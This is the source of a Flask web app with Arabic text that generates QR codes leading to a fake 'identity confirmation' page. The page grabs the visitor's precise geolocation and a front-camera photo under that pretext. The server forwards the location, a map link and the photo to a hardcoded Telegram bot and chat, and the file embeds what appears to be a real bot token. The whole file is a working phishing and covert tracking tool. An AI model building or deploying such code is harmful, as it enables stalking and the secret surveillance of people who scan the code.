import os
import io
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_file, abort
import qrcode

app = Flask(__name__)

# ===== الإعدادات =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8930638150:AAFre62IhfHeCUDI6IBg4iTNXrLVkKm5C2I")
CHAT_ID   = os.environ.get("CHAT_ID", "8653922501")
BASE_URL  = os.environ.get("BASE_URL", "https://your-app.onrender.com")  # بدّلها بعد النشر

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


# ===== صفحة المسح =====
SCAN_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>جاري التحقق...</title>
<style>
  body { font-family: system-ui, sans-serif; background:#111; color:#eee; margin:0; padding:20px; text-align:center; }
  h2 { margin-top:10px; }
  video, canvas { width:100%; max-width:400px; border-radius:12px; margin-top:10px; background:#000; }
  button { background:#2b8aef; color:#fff; border:0; padding:14px 28px; font-size:16px; border-radius:10px; margin-top:14px; cursor:pointer; }
  button:disabled { background:#555; }
  #status { margin-top:14px; color:#9ad; }
  .hidden { display:none; }
</style>
</head>
<body>
  <h2>📸 تأكيد الهوية</h2>
  <p id="status">جاري طلب إذن الموقع...</p>

  <video id="video" autoplay playsinline class="hidden"></video>
  <canvas id="canvas" class="hidden"></canvas>

  <button id="captureBtn" class="hidden" disabled>التقاط وإرسال</button>

<script>
const scanId = "{{ scan_id }}";
let lat = null, lng = null;
let stream = null;

// 1) طلب الموقع
function getLocation() {
  if (!navigator.geolocation) {
    document.getElementById('status').innerText = '⚠️ المتصفح لا يدعم الموقع';
    return;
  }
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      lat = pos.coords.latitude;
      lng = pos.coords.longitude;
      document.getElementById('status').innerText = '✅ تم تحديد الموقع، جاري تشغيل الكاميرا...';
      startCamera();
    },
    (err) => {
      document.getElementById('status').innerText = '⚠️ تم رفض الموقع، جاري تشغيل الكاميرا...';
      startCamera();
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
}

// 2) تشغيل الكاميرا الأمامية
async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const v = document.getElementById('video');
    v.srcObject = stream;
    v.classList.remove('hidden');
    document.getElementById('captureBtn').classList.remove('hidden');
    document.getElementById('captureBtn').disabled = false;
    document.getElementById('status').innerText = 'اضغط الزر لالتقاط الصورة';
  } catch (e) {
    document.getElementById('status').innerText = '⚠️ تعذّر تشغيل الكاميرا: ' + e.message;
  }
}

// 3) الالتقاط والإرسال
document.getElementById('captureBtn').onclick = async () => {
  const v = document.getElementById('video');
  const c = document.getElementById('canvas');
  c.width = v.videoWidth;
  c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  const dataUrl = c.toDataURL('image/jpeg', 0.85);

  if (stream) stream.getTracks().forEach(t => t.stop());
  document.getElementById('captureBtn').disabled = true;
  document.getElementById('status').innerText = '📤 جاري الإرسال...';

  try {
    const res = await fetch('/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ scan_id: scanId, lat, lng, image: dataUrl })
    });
    const j = await res.json();
    if (j.ok) {
      document.getElementById('status').innerText = '✅ تم الإرسال بنجاح!';
      document.body.innerHTML = '<h2>✅ تم التحقق</h2><p>يمكنك إغلاق الصفحة.</p>';
    } else {
      document.getElementById('status').innerText = '❌ فشل الإرسال';
    }
  } catch (e) {
    document.getElementById('status').innerText = '❌ خطأ: ' + e.message;
  }
};

getLocation();
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return "السيرفر يعمل ✅"


@app.route("/scan/<scan_id>")
def scan(scan_id):
    return render_template_string(SCAN_PAGE, scan_id=scan_id)


@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json(force=True)
    scan_id = data.get("scan_id", "?")
    lat = data.get("lat")
    lng = data.get("lng")
    image_data = data.get("image")

    text = f"🔔 تم مسح الرابط\n\n🆔 المعرّف: {scan_id}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    # إرسال الموقع
    if lat and lng:
        try:
            requests.post(f"{TG_API}/sendMessage", json={
                "chat_id": CHAT_ID,
                "text": text + f"\n\n📍 الموقع:\nhttps://maps.google.com/?q={lat},{lng}"
            }, timeout=15)
            requests.post(f"{TG_API}/sendLocation", json={
                "chat_id": CHAT_ID,
                "latitude": lat,
                "longitude": lng
            }, timeout=15)
        except Exception as e:
            print("sendLocation error:", e)
    else:
        requests.post(f"{TG_API}/sendMessage", json={
            "chat_id": CHAT_ID,
            "text": text + "\n\n⚠️ لم يُسمح بالموقع"
        }, timeout=15)

    # إرسال الصورة
    if image_data and image_data.startswith("data:image"):
        import base64
        header, b64 = image_data.split(",", 1)
        img_bytes = base64.b64decode(b64)
        try:
            requests.post(
                f"{TG_API}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": f"📸 صورة من المعرّف: {scan_id}"},
                files={"photo": ("photo.jpg", io.BytesIO(img_bytes), "image/jpeg")},
                timeout=30
            )
        except Exception as e:
            print("sendPhoto error:", e)

    return jsonify(ok=True)


@app.route("/qr/<scan_id>")
def qr(scan_id):
    """يولّد QR Code يشير إلى صفحة المسح"""
    target = f"{BASE_URL}/scan/{scan_id}"
    img = qrcode.make(target)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return send_file(buf, mimetype="image/png")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))